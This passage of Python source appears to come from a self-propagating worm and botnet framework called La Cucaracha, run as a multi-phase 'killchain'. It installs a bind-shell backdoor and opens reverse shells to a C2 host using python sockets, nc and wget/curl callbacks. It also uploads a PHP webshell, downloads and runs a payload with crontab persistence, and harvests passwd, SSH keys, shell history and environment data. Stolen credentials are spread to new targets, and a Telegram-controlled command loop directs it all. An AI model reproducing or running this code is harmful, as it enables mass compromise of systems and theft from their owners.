        # 4. Bind shell backdoor
        bind_cmd = (f"nohup python3 -c 'import socket,subprocess,os;"
                    f"s=socket.socket();s.setsockopt(socket.SOL_SOCKET,"
                    f"socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{43210}));"
                    f"s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);"
                    f"os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
                    f"subprocess.call([\"/bin/sh\",\"-i\"])' &")
        ok, out = _exec_on_target(ip, port, bind_cmd, user, pwd)
        if ok:
            results.append("bind_shell")
        
        if results:
            db.mark_pwned(ip, port, "backdoor_installed")
            log.info(f"🚪 BACKDOOR: {ip}:{port} -> {'+'.join(results)}")
            return port
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        for res in pool.map(_install_backdoor, targets):
            if res:
                count += 1
    
    log.info(f"🚪 BACKDOOR: {count} installed from {len(targets)} targets")
    return {"count": count, "success": count > 0, "targets": []}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 11: TUNNEL
# ═══════════════════════════════════════════════════════════════════════════════

def phase_tunnel(db: KillchainDB) -> Dict:
    """Establish reverse tunnels to C2 — Phase 11."""
    log.info("🔌 PHASE 11: TUNNEL — establishing reverse tunnels")
    count = 0
    
    targets = db.q("SELECT * FROM targets WHERE tunnel_active=0 AND backdoor_installed=1 LIMIT 50")
    if not targets:
        log.info("🔌 No targets for tunnel")
        return {"count": 0, "success": False, "targets": []}
    
    def _get_creds(target: Dict) -> tuple:
        ip = target["ip"]
        port = int(target["port"])
        rows = db.q(
            "SELECT username, password FROM credentials WHERE ip=? AND port=? AND valid=1 LIMIT 1",
            (ip, port)
        )
        if rows:
            return rows[0]["username"], rows[0]["password"]
        return "root", "root"
    
    def _exec_on_target(ip: str, port: int, cmd: str, user: str, pwd: str) -> tuple:
        # Same as phase 10
        if port in (23, 7547):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((ip, port))
                time.sleep(0.5)
                s.sendall(f"{user}\n".encode())
                time.sleep(0.3)
                s.sendall(f"{pwd}\n".encode())
                time.sleep(1)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                s.sendall(f"{cmd}\n".encode())
                time.sleep(1.5)
                resp = b""
                try:
                    resp = s.recv(4096)
                except socket.timeout:
                    pass
                s.close()
                return True, resp.decode("utf-8", errors="replace")[:500]
            except Exception as e:
                return False, str(e)
        
        if port in (22, 2222):
            try:
                if pwd:
                    result = subprocess.run(
                        ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", cmd],
                        capture_output=True, timeout=15, text=True
                    )
                else:
                    result = subprocess.run(
                        ["ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", cmd],
                        capture_output=True, timeout=15, text=True
                    )
                if result.returncode == 0:
                    return True, result.stdout[:500]
                return False, result.stderr[:200]
            except Exception as e:
                return False, str(e)
        
        # HTTP shell via PHP webshell
        if port in (80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9443, 9999):
            try:
                scheme = "https" if port in (443, 8443, 9443) else "http"
                import requests as _req
                _req.packages.urllib3.disable_warnings()
                _s = _req.Session()
                _s.auth = (user, pwd) if user else None
                _s.verify = False
                # Try existing shell paths
                for _sp in ["/shell.php", "/cmd.php", "/exec.php", "/admin/shell.php", "/tmp/s.php"]:
                    try:
                        _r = _s.get(f"{scheme}://{ip}:{port}{_sp}?c={urllib.parse.quote(cmd)}", timeout=5)
                        if _r.status_code == 200 and _r.text.strip():
                            _s.close()
                            return True, _r.text[:500]
                    except:
                        continue
                # Try to upload and execute
                _sh = "<?php system($_GET['c']);?>"
                for _up in ["/shell.php", "/cmd.php", "/exec.php"]:
                    try:
                        _r = _s.put(f"{scheme}://{ip}:{port}{_up}", data=_sh, timeout=5)
                        if _r.status_code not in (404, 403, 405):
                            _vu = f"{scheme}://{ip}:{port}{_up}?c={urllib.parse.quote(cmd)}"
                            _rv = _s.get(_vu, timeout=5)
                            if _rv.status_code == 200 and _rv.text.strip():
                                log.info(f"🔌 TUNNEL_SHELL: {ip}:{port}{_up}")
                                _s.close()
                                return True, _rv.text[:500]
                    except:
                        continue
                _s.close()
            except:
                pass
            return False, "No HTTP shell"
        
        return False, "No execution method"
    
    def _setup_tunnel(target: Dict) -> Optional[int]:
        ip = target["ip"]
        port = int(target["port"])
        user, pwd = _get_creds(target)
        results = []
        listener_port = 10001
        
        # Method 1: Python reverse tunnel
        py_rev = (
            f"nohup python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{C2_HOST}\",{listener_port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' 2>/dev/null &"
        )
        ok, out = _exec_on_target(ip, port, py_rev, user, pwd)
        if ok:
            results.append("python_rev")
            time.sleep(1)
        
        # Method 2: nc/busybox reverse
        nc_rev = (
            f"nohup rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|"
            f"/bin/sh -i 2>&1|nc {C2_HOST} {listener_port} >/tmp/f 2>/dev/null &"
        )
        ok2, _ = _exec_on_target(ip, port, nc_rev, user, pwd)
        if ok2:
            results.append("nc_rev")
        
        # Method 3: HTTP callback tunnel (heartbeat-based)
        hb_url = f"http://{C2_HOST}:{C2_PORT}/tunnel/{ip}"
        hb_cmd = (
            f"nohup sh -c 'while true; do "
            f"wget -q -O- \"{hb_url}\" -T 10 || curl -s \"{hb_url}\" -m 10; "
            f"sleep 60; done' 2>/dev/null &"
        )
        ok3, _ = _exec_on_target(ip, port, hb_cmd, user, pwd)
        if ok3:
            results.append("http_callback")
        
        if results:
            db.mark_pwned(ip, port, "tunnel_active")
            log.info(f"🔌 TUNNEL: {ip}:{port} -> {'+'.join(results)}")
            return port
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        for res in pool.map(_setup_tunnel, targets):
            if res:
                count += 1
    
    log.info(f"🔌 TUNNEL: {count} established from {len(targets)} targets")
    return {"count": count, "success": count > 0, "targets": []}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 12: WORM DEPLOYMENT
# ═══════════════════════════════════════════════════════════════════════════════

def phase_worm_deploy(db: KillchainDB) -> Dict:
    """Deploy La Cucaracha payload to targets for worm propagation — Phase 12."""
    log.info("🐛 PHASE 12: WORM DEPLOYMENT — propagating payload")
    count = 0
    
    targets = db.q("SELECT * FROM targets WHERE worm_deployed=0 AND backdoor_installed=1 AND tunnel_active=1 LIMIT 80")
    if not targets:
        # Try targets with backdoor but no tunnel
        targets = db.q("SELECT * FROM targets WHERE worm_deployed=0 AND backdoor_installed=1 LIMIT 50")
    if not targets:
        log.info("🐛 No targets for worm deployment")
        return {"count": 0, "success": False, "targets": []}
    
    def _get_creds(target: Dict) -> tuple:
        ip = target["ip"]
        port = int(target["port"])
        rows = db.q(
            "SELECT username, password FROM credentials WHERE ip=? AND port=? AND valid=1 LIMIT 1",
            (ip, port)
        )
        if rows:
            return rows[0]["username"], rows[0]["password"]
        return "root", "root"
    
    def _exec_on_target(ip: str, port: int, cmd: str, user: str, pwd: str) -> tuple:
        # Same as phases 10-11
        if port in (23, 7547):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((ip, port))
                time.sleep(0.5)
                s.sendall(f"{user}\n".encode())
                time.sleep(0.3)
                s.sendall(f"{pwd}\n".encode())
                time.sleep(1)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                s.sendall(f"{cmd}\n".encode())
                time.sleep(1.5)
                resp = b""
                try:
                    resp = s.recv(4096)
                except socket.timeout:
                    pass
                s.close()
                return True, resp.decode("utf-8", errors="replace")[:500]
            except Exception as e:
                return False, str(e)
        
        if port in (22, 2222):
            try:
                if pwd:
                    result = subprocess.run(
                        ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", cmd],
                        capture_output=True, timeout=15, text=True
                    )
                else:
                    result = subprocess.run(
                        ["ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", cmd],
                        capture_output=True, timeout=15, text=True
                    )
                if result.returncode == 0:
                    return True, result.stdout[:500]
                return False, result.stderr[:200]
            except Exception as e:
                return False, str(e)
        
        # HTTP shell via PHP webshell
        if port in (80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9443, 9999):
            try:
                scheme = "https" if port in (443, 8443, 9443) else "http"
                import requests as _req
                _req.packages.urllib3.disable_warnings()
                _s = _req.Session()
                _s.auth = (user, pwd) if user else None
                _s.verify = False
                for _sp in ["/shell.php", "/cmd.php", "/exec.php", "/admin/shell.php", "/tmp/s.php"]:
                    try:
                        _r = _s.get(f"{scheme}://{ip}:{port}{_sp}?c={urllib.parse.quote(cmd)}", timeout=5)
                        if _r.status_code == 200 and _r.text.strip():
                            _s.close()
                            return True, _r.text[:500]
                    except:
                        continue
                _sh = "<?php system($_GET['c']);?>"
                for _up in ["/shell.php", "/cmd.php", "/exec.php"]:
                    try:
                        _r = _s.put(f"{scheme}://{ip}:{port}{_up}", data=_sh, timeout=5)
                        if _r.status_code not in (404, 403, 405):
                            _vu = f"{scheme}://{ip}:{port}{_up}?c={urllib.parse.quote(cmd)}"
                            _rv = _s.get(_vu, timeout=5)
                            if _rv.status_code == 200 and _rv.text.strip():
                                log.info(f"🐛 WORM_SHELL: {ip}:{port}{_up}")
                                _s.close()
                                return True, _rv.text[:500]
                    except:
                        continue
                _s.close()
            except:
                pass
            return False, "No HTTP shell"
        
        return False, "No execution method"
    
    def _deploy_worm(target: Dict) -> Optional[int]:
        ip = target["ip"]
        port = int(target["port"])
        user, pwd = _get_creds(target)
        
        # Try wget first, then curl, then python
        dl_cmds = [
            f"wget -q -O /tmp/la_cucaracha.py {PAYLOAD_URL}",
            f"curl -s -o /tmp/la_cucaracha.py {PAYLOAD_URL}",
            f"python3 -c \"import urllib.request; urllib.request.urlretrieve('{PAYLOAD_URL}','/tmp/la_cucaracha.py')\"",
        ]
        
        deployed = False
        for dl_cmd in dl_cmds:
            ok, _ = _exec_on_target(ip, port, dl_cmd, user, pwd)
            if ok:
                deployed = True
                break
        
        if not deployed:
            # Try echo-based deployment (base64)
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                req = urllib.request.Request(PAYLOAD_URL)
                with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                    payload_data = resp.read()
                b64 = base64.b64encode(payload_data).decode()
                echo_cmd = f"echo '{b64}' | base64 -d > /tmp/la_cucaracha.py"
                ok, _ = _exec_on_target(ip, port, echo_cmd, user, pwd)
                if ok:
                    deployed = True
            except Exception:
                pass
        
        if deployed:
            # Run the payload
            run_cmds = [
                "chmod +x /tmp/la_cucaracha.py && nohup python3 /tmp/la_cucaracha.py &",
                "chmod +x /tmp/la_cucaracha.py && nohup python /tmp/la_cucaracha.py &",
            ]
            for run_cmd in run_cmds:
                ok, _ = _exec_on_target(ip, port, run_cmd, user, pwd)
                if ok:
                    break
            
            # Persist in crontab
            persist_cmd = (
                f"(crontab -l 2>/dev/null; echo '*/10 * * * * "
                f"python3 /tmp/la_cucaracha.py') | crontab -"
            )
            _exec_on_target(ip, port, persist_cmd, user, pwd)
            
            # Register in worm mesh
            db.mark_pwned(ip, port, "worm_deployed")
            try:
                db.q(
                    "INSERT OR IGNORE INTO worm_mesh (node_ip, node_port, version) "
                    "VALUES (?, ?, ?)",
                    (ip, C2_PORT, "5.0")
                )
            except Exception:
                pass
            
            log.info(f"🐛 WORM DEPLOYED: {ip}:{port}")
            return port
        
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        for res in pool.map(_deploy_worm, targets):
            if res:
                count += 1
    
    log.info(f"🐛 WORM: {count} deployed from {len(targets)} targets")
    return {"count": count, "success": count > 0, "targets": []}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 13: INTEL GATHERING
# ═══════════════════════════════════════════════════════════════════════════════

def phase_intel(db: KillchainDB) -> Dict:
    """Gather intelligence from worm-deployed targets — Phase 13."""
    log.info("🧠 PHASE 13: INTEL GATHERING — extracting data from targets")
    count = 0
    
    targets = db.q("SELECT * FROM targets WHERE intel_collected=0 AND worm_deployed=1 LIMIT 80")
    if not targets:
        log.info("🧠 No targets for intel gathering")
        return {"count": 0, "success": False, "targets": []}
    
    def _get_creds(target: Dict) -> tuple:
        ip = target["ip"]
        port = int(target["port"])
        rows = db.q(
            "SELECT username, password FROM credentials WHERE ip=? AND port=? AND valid=1 LIMIT 1",
            (ip, port)
        )
        if rows:
            return rows[0]["username"], rows[0]["password"]
        return "root", "root"
    
    def _exec_on_target(ip: str, port: int, cmd: str, user: str, pwd: str) -> tuple:
        # Same as previous phases
        if port in (23, 7547):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((ip, port))
                time.sleep(0.5)
                s.sendall(f"{user}\n".encode())
                time.sleep(0.3)
                s.sendall(f"{pwd}\n".encode())
                time.sleep(1)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                s.sendall(f"{cmd}\n".encode())
                time.sleep(1.5)
                resp = b""
                try:
                    resp = s.recv(4096)
                except socket.timeout:
                    pass
                s.close()
                return True, resp.decode("utf-8", errors="replace")[:500]
            except Exception as e:
                return False, str(e)
        
        if port in (22, 2222):
            try:
                if pwd:
                    result = subprocess.run(
                        ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", cmd],
                        capture_output=True, timeout=15, text=True
                    )
                else:
                    result = subprocess.run(
                        ["ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", cmd],
                        capture_output=True, timeout=15, text=True
                    )
                if result.returncode == 0:
                    return True, result.stdout[:500]
                return False, result.stderr[:200]
            except Exception as e:
                return False, str(e)
        
        return False, "No execution method"
    
    intel_commands = [
        ("network", "ifconfig 2>/dev/null || ip addr 2>/dev/null"),
        ("passwd", "cat /etc/passwd 2>/dev/null | head -20"),
        ("processes", "ps aux 2>/dev/null | head -30"),
        ("listeners", "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null"),
        ("kernel", "uname -a 2>/dev/null"),
        ("env", "env 2>/dev/null | head -30"),
        ("disk", "df -h 2>/dev/null | head -10"),
        ("uptime", "uptime 2>/dev/null"),
        ("who", "who 2>/dev/null; w 2>/dev/null"),
        ("docker", "docker ps 2>/dev/null | head -10"),
        ("ssh_keys", "cat ~/.ssh/authorized_keys 2>/dev/null | head -10"),
        ("history", "cat ~/.bash_history 2>/dev/null | tail -20"),
        ("crontab", "crontab -l 2>/dev/null | head -20"),
        ("hosts", "cat /etc/hosts 2>/dev/null"),
        ("resolv", "cat /etc/resolv.conf 2>/dev/null"),
    ]
    
    def _gather_intel(target: Dict) -> Optional[int]:
        ip = target["ip"]
        port = int(target["port"])
        user, pwd = _get_creds(target)
        log_count = 0
        
        for intel_type, cmd in intel_commands[:8]:  # Top 8 to keep it light
            try:
                if port in (22, 2222):
                    ok, output = _exec_on_target(ip, port, cmd, user, pwd)
                elif port in (23, 7547):
                    ok, output = _exec_on_target(ip, port, cmd, user, pwd)
                else:
                    ok, output = False, ""
                
                if ok and output and output.strip():
                    try:
                        db.q(
                            "INSERT INTO intel_log (ip, port, intel_type, intel_data) VALUES (?, ?, ?, ?)",
                            (ip, port, intel_type, output[:1000])
                        )
                        log_count += 1
                    except Exception:
                        pass
            except Exception:
                continue
        
        if log_count > 0:
            db.mark_pwned(ip, port, "intel_collected")
            log.info(f"🧠 INTEL: {ip}:{port} -> {log_count} logs collected")
            return log_count
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        for res in pool.map(_gather_intel, targets):
            if res:
                count += res
    
    log.info(f"🧠 INTEL: {count} intel logs from {len(targets)} targets")
    return {"count": count, "success": count > 0, "targets": []}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 14: SLEEP (Adaptive Cooldown)
# ═══════════════════════════════════════════════════════════════════════════════

def phase_sleep(db: KillchainDB, result: Dict) -> Dict:
    """Adaptive cooldown based on hit/empty streaks — Phase 14."""
    hit_streak = result.get("hit_streak", 0)
    empty_streak = result.get("empty_streak", 0)
    
    if hit_streak > 5:
        duration = 5
        reason = "hot streak"
    elif empty_streak > 5:
        duration = 30
        reason = "cold streak"
    else:
        duration = 10
        reason = "normal cooldown"
    
    log.info(f"💤 PHASE 14: SLEEP — {duration}s ({reason})")
    for _ in range(duration):
        time.sleep(1)
    
    return {"count": duration, "success": True, "targets": []}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 15: CROSSFEED
# ═══════════════════════════════════════════════════════════════════════════════

def phase_crossfeed(db: KillchainDB) -> Dict:
    """Cross-contamination: share intel/creds between components — Phase 15."""
    log.info("🔄 PHASE 15: CROSSFEED — cross-contaminating data")
    ops = 0
    
    try:
        # 1. Cross-feed credentials between IPs
        cred_rows = db.q(
            "SELECT ip, port, username, password FROM credentials WHERE valid=1 "
            "ORDER BY last_used DESC LIMIT 50"
        )
        if cred_rows:
            for cred in cred_rows:
                src_ip = cred.get("ip", "")
                user = cred.get("username", "")
                pwd = cred.get("password", "")
                if not user or not pwd or src_ip in ("0.0.0.0", ""):
                    continue
                # Find other targets that might use these creds
                other_targets = db.q(
                    "SELECT DISTINCT ip, port FROM targets WHERE ip != ? AND tcp_open=1 "
                    "AND (brute_pwned=0 AND web_pwned=0 AND embed_pwned=0 AND enterprise_pwned=0) LIMIT 20",
                    (src_ip,)
                )
                for tgt in other_targets:
                    try:
                        db.q(
                            "INSERT OR IGNORE INTO credentials (ip, port, service, username, password, source) "
                            "VALUES (?, ?, ?, ?, ?, ?)",
                            (tgt["ip"], tgt["port"], SERVICE_NAME.get(tgt["port"], "unknown"),
                             user, pwd, "crossfeed")
                        )
                        ops += 1
                    except Exception:
                        pass
        
        # 2. Crossfeed worm mesh — update peer lists
        nodes = db.q("SELECT node_ip, peer_ips FROM worm_mesh WHERE active=1 LIMIT 20")
        if len(nodes) > 1:
            all_ips = [n["node_ip"] for n in nodes]
            for node in nodes:
                existing = node.get("peer_ips", "").split(",") if node.get("peer_ips") else []
                new_peers = set(all_ips) - set(existing) - {node["node_ip"]}
                if new_peers:
                    updated = ",".join(list(set(existing) | new_peers))[:500]
                    try:
                        db.q(
                            "UPDATE worm_mesh SET peer_ips=? WHERE node_ip=?",
                            (updated, node["node_ip"])
                        )
                        ops += 1
                    except Exception:
                        pass
        
        # 3. Crossfeed new targets from intel data (IPs found in logs)
        intel_rows = db.q(
            "SELECT intel_data FROM intel_log WHERE intel_type='network' ORDER BY id DESC LIMIT 10"
        )
        for row in intel_rows:
            ips_found = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',
                                   row.get("intel_data", ""))
            for found_ip in ips_found:
                if not found_ip.startswith(("127.", "10.", "172.16", "192.168.", "0.")):
                    try:
                        db.q(
                            "INSERT OR IGNORE INTO targets (ip, port, protocol) VALUES (?, ?, ?)",
                            (found_ip, 80, "tcp")
                        )
                        ops += 1
                    except Exception:
                        pass
        
        # 4. Broadcast latest payload URL to all worm nodes
        nodes = db.q("SELECT node_ip FROM worm_mesh WHERE active=1 LIMIT 10")
        for node in nodes:
            node_ip = node["node_ip"]
            try:
                update_url = f"http://{node_ip}:{C2_PORT}/update/{PAYLOAD_URL}"
                req = urllib.request.Request(update_url)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                urllib.request.urlopen(req, timeout=3, context=ctx)
                ops += 1
            except Exception:
                pass
        
        # 5. Update crossfeed count on targets
        db.q("UPDATE targets SET crossfeed_count=crossfeed_count+1 WHERE worm_deployed=1")
        
        if ops:
            log.info(f"🔄 CROSSFEED: {ops} operations completed")
        
    except Exception as e:
        log.error(f"CROSSFEED error: {e}")
    
    log.info(f"🔄 CROSSFEED: {ops} operations")
    return {"count": ops, "success": ops > 0, "targets": []}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 16: INTEL REPORT
# ═══════════════════════════════════════════════════════════════════════════════

def phase_report(db: KillchainDB) -> Dict:
    """Generate structured intel report from DB state — Phase 16."""
    log.info("📦 PHASE 16: INTEL REPORT — generating comprehensive report")
    
    stats = db.stats()
    
    # Get top targets by port
    top_ports = db.q("SELECT port, COUNT(*) as c FROM targets GROUP BY port ORDER BY c DESC LIMIT 10")
    
    # Get worm mesh topology
    nodes = db.q("SELECT * FROM worm_mesh WHERE active=1 LIMIT 20")
    
    # Get credential analysis
    cred_stats = db.q("SELECT source, COUNT(*) as c FROM credentials GROUP BY source")
    
    # Get recent intel
    recent_intel = db.q("SELECT ip, port, intel_type, collected_at FROM intel_log ORDER BY id DESC LIMIT 20")
    
    # Build report
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "version": "5.0",
        "summary": stats,
        "top_ports": [{"port": r["port"], "count": r["c"]} for r in top_ports] if top_ports else [],
        "worm_mesh": {
            "node_count": len(nodes) if nodes else 0,
            "nodes": [n["node_ip"] for n in nodes] if nodes else [],
        },
        "credential_analysis": {r["source"]: r["c"] for r in cred_stats} if cred_stats else {},
        "recent_intel": [dict(r) for r in recent_intel] if recent_intel else [],
        "phase_completion": {
            "icmp": stats.get("icmp_alive", 0),
            "tcp": stats.get("tcp_open", 0),
            "fp": stats.get("fp_done", 0),
            "cve": stats.get("cve_found", 0),
            "web": stats.get("web_pwned", 0),
            "embed": stats.get("embed_pwned", 0),
            "enterprise": stats.get("enterprise_pwned", 0),
            "brute": stats.get("brute_pwned", 0),
            "backdoor": stats.get("backdoor_installed", 0),
            "tunnel": stats.get("tunnel_active", 0),
            "worm": stats.get("worm_deployed", 0),
            "intel": stats.get("intel_collected", 0),
        }
    }
    
    # Save report to file
    report_path = f"intel_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    try:
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)
        log.info(f"📦 Report saved to {report_path}")
    except Exception as e:
        log.error(f"Failed to save report: {e}")
    
    # Mark targets as reported
    db.q("UPDATE targets SET report_generated=1")
    
    log.info("📦 REPORT: Intel summary generated")
    return {"count": 1, "success": True, "targets": [], "report": report}

# ═══════════════════════════════════════════════════════════════════════════════
# KILLCHAIN ORCHESTRATOR — Master Controller with IF/THEN Logic
# ═══════════════════════════════════════════════════════════════════════════════

class KillchainOrchestrator:
    """Master orchestrator for the 16-phase killchain with IF/THEN decision logic.
    
    Each phase executes, reports results, and the decision engine determines
    the next phase based on IF/THEN rules. The orchestrator maintains state,
    tracks streaks, and adapts behavior dynamically.
    """
    
    def __init__(self, db: KillchainDB, max_epochs: int = 100):
        self.db = db
        self.max_epochs = max_epochs
        self.epoch = 0
        self.current_phase = "ICMP"
        self.decision_engine = DecisionEngine16()
        self.phase_map = {
            "ICMP": phase_icmp_sweep,
            "TCP": phase_tcp_scan,
            "FP": phase_fingerprint,
            "CVE": phase_cve_scan,
            "WEB": phase_web_exploit,
            "EMBED": phase_embed_exploit,
            "GENZAI": phase_genzai_merge,
            "ENTERPRISE": phase_enterprise_exploit,
            "BRUTE": phase_brute_force,
            "BACKDOOR": phase_backdoor,
            "TUNNEL": phase_tunnel,
            "WORM": phase_worm_deploy,
            "INTEL": phase_intel,
            "SLEEP": phase_sleep,
            "CROSSFEED": phase_crossfeed,
            "REPORT": phase_report,
        }
        self.phase_stats = {p: {"count": 0, "success": False, "last_run": None} for p in PHASES_16}
        self.start_time = time.time()
        self._stop_flag = False
        self.epoch_results = []
        
    def stop(self):
        """Stop the orchestrator."""
        self._stop_flag = True
        
    def get_status(self) -> Dict:
        """Get current orchestrator status."""
        uptime = int(time.time() - self.start_time)
        return {
            "epoch": self.epoch,
            "current_phase": self.current_phase,
            "uptime_seconds": uptime,
            "uptime_human": f"{uptime//3600}h{(uptime%3600)//60}m" if uptime > 3600 else f"{uptime//60}m",
            "decision": self.decision_engine.last_decision,
            "hit_streak": self.decision_engine.hit_streak,
            "empty_streak": self.decision_engine.empty_streak,
            "phase_counts": self.decision_engine.phase_counts,
            "db_stats": self.db.stats(),
        }

    def _process_bot_commands(self) -> None:
        """Check bot_commands.db for pending commands from Telegram bot."""
        try:
            import sqlite3
            bc_path = "/opt/hermes/bot_commands.db"
            if not os.path.exists(bc_path):
                return
            conn = sqlite3.connect(bc_path, timeout=2)
            c = conn.execute(
                "SELECT id, command, params FROM bot_commands WHERE status='pending' ORDER BY id ASC LIMIT 5"
            )
            rows = c.fetchall()
            for row in rows:
                cmd_id, cmd, params = row
                log.info(f"📨 Bot command #{cmd_id}: /{cmd} {params}")
                
                # --- SHUTDOWN / KILLSWITCH ---
                if cmd == "shutdown":
                    self._stop_flag = True
                    conn.execute("UPDATE bot_commands SET status='done', result='shutdown', processed_at=? WHERE id=?", 
                                 (time.time(), cmd_id))
                    log.info("🛑 Bot commanded shutdown after current epoch")
                
                elif cmd == "killswitch":
                    self._stop_flag = True
                    conn.execute("UPDATE bot_commands SET status='done', result='killswitch', processed_at=? WHERE id=?", 
                                 (time.time(), cmd_id))
                    log.warning("💀 KILLSWITCH ACTIVATED by bot command")
                    # Force immediate stop via OS signal to self
                    os._exit(0)
                
                # --- SCAN ---
                elif cmd == "scan":
                    subnets_to_scan = 10
                    hosts_per = 20
                    if params and params != "random":
                        try:
                            if "/" in params:
                                subnets_to_scan, hosts_per = 1, 50
                            else:
                                hosts_per = int(params)
                        except: pass
                    try:
                        # Phase functions are defined in this same module
                        import sys, types
                        phase_fn = globals().get("phase_icmp_sweep")
                        if phase_fn is None:
                            raise ImportError("phase_icmp_sweep not loaded in module globals")
                        result = phase_fn(self.db, subnets=subnets_to_scan, hosts_per_subnet=hosts_per)
                        count = result.get("count", 0)
                        conn.execute(
                            "UPDATE bot_commands SET status='done', result=?, processed_at=? WHERE id=?",
                            (f"ICMP scan: {count} alive", time.time(), cmd_id)
                        )
                        log.info(f"🔍 Bot-commanded scan found {count} targets")
                    except Exception as e:
                        conn.execute("UPDATE bot_commands SET status='failed', result=?, processed_at=? WHERE id=?",
                                     (str(e)[:200], time.time(), cmd_id))
                
                # --- EXPLOIT ---
                elif cmd == "exploit":
                    try:
                        count = int(params) if params and params.isdigit() else 10
                        targets = self.db.q("SELECT ip FROM targets WHERE icmp_alive=1 AND web_pwned=0 LIMIT ?", (count,))
                        pwned = 0
                        for t in targets:
                            ip = t["ip"]
                            # Try CVE phase
                            try:
                                from phases import phase_cve_scan
                                phase_cve_scan(self.db, targets=[ip])
                            except: pass
                            # Try WEB
                            try:
                                from phases import phase_web_pwn
                                phase_web_pwn(self.db, targets=[ip])
                                pwned += 1
                            except: pass
                        conn.execute(
                            "UPDATE bot_commands SET status='done', result=?, processed_at=? WHERE id=?",
                            (f"Exploited: {pwned}/{len(targets)}", time.time(), cmd_id)
                        )
                    except Exception as e:
                        conn.execute("UPDATE bot_commands SET status='failed', result=?, processed_at=? WHERE id=?",
                                     (str(e)[:100], time.time(), cmd_id))
                
                # --- DEPLOY ---
                elif cmd == "deploy":
                    try:
                        from phases import phase_worm_deploy
                        result = phase_worm_deploy(self.db)
                        deployed = result.get("count", 0)
                        conn.execute(
                            "UPDATE bot_commands SET status='done', result=?, processed_at=? WHERE id=?",
                            (f"Worm deployed on {deployed} targets", time.time(), cmd_id)
                        )
                    except Exception as e:
                        conn.execute("UPDATE bot_commands SET status='failed', result=?, processed_at=? WHERE id=?",
                                     (str(e)[:100], time.time(), cmd_id))
                
                # --- HARVEST ---
                elif cmd == "harvest":
                    try:
                        from phases import phase_intel
                        result = phase_intel(self.db)
                        harvested = result.get("count", 0)
                        conn.execute(
                            "UPDATE bot_commands SET status='done', result=?, processed_at=? WHERE id=?",
                            (f"Intel harvested: {harvested} logs", time.time(), cmd_id)
                        )
                    except Exception as e:
                        conn.execute("UPDATE bot_commands SET status='failed', result=?, processed_at=? WHERE id=?",
                                     (str(e)[:100], time.time(), cmd_id))
                
                # --- EXFIL / BROADCAST / EXEC (acknowledge only - real implementation needs mesh channel) ---
                elif cmd in ("exfil", "broadcast", "exec"):
                    conn.execute(
                        "UPDATE bot_commands SET status='queued', result='acknowledged - mesh integration pending', processed_at=? WHERE id=?",
                        (time.time(), cmd_id)
                    )
                
                else:
                    log.warning(f"Unknown bot command: /{cmd}")
                    conn.execute("UPDATE bot_commands SET status='unknown', processed_at=? WHERE id=?", (time.time(), cmd_id))
            
            conn.commit()
            conn.close()
        except Exception as e:
            log.warning(f"Bot command processor error: {e}")

    def _check_control_flags(self) -> None:
        """Check control signal files from Telegram bot."""
        try:
            # Aggressive mode
            if os.path.exists("/tmp/lacucaracha_aggressive"):
                with open("/tmp/lacucaracha_aggressive") as f:
                    val = f.read().strip()
                self.decision_engine.aggressive = (val == "1")
                os.unlink("/tmp/lacucaracha_aggressive")
                log.info(f"🔥 Aggressive mode set to: {self.decision_engine.aggressive}")
            
            # Predator mode
            if os.path.exists("/tmp/lacucaracha_predator"):
                with open("/tmp/lacucaracha_predator") as f:
                    val = f.read().strip()
                self.decision_engine.predator = (val == "1")
                os.unlink("/tmp/lacucaracha_predator")
